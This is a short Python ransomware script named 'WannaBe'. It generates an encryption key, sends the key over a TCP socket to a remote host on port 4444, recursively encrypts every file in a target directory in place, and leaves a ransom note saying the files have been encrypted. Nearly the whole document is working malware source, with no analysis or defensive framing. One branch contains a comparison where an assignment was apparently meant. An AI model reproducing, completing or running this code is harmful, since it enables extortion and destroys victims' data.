# WannaBe

from cryptography.fernet import Fernet
import socket
import os

key = Fernet.generate_key()

directoryName = "directory"

host = "0.0.0.0"

port = 4444

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client.connect((host, port))

client.send(key)

def encryptFile(filePath, userKey):
    with open(filePath, "rb") as file:
        data = file.read()
    fernet = Fernet(userKey)
    encryptedData = fernet.encrypt(data)

    with open(filePath, "wb") as file:
        file.write(encryptedData)

def encryptDirectory(directoryPath, userKey):
    for root, dirs, files in os.walk(directoryPath):
        for file in files:
            filePath = os.path.join(root, file)
            encryptFile(filePath, userKey)

if __name__ == "__main__":
    if os.name == "posix":
        mainDirectory = "linux"

        encryptDirectory(mainDirectory, key)

        newFile = open("lizard.txt", "x")
        newFile.write(f"Your file has been encrypted. ")
    else:
        mainDirectory == "windows"

        encryptDirectory(mainDirectory, key)

        newFile = open("lizard.txt", "x")
        newFile.write(f"Your file has been encrypted. ")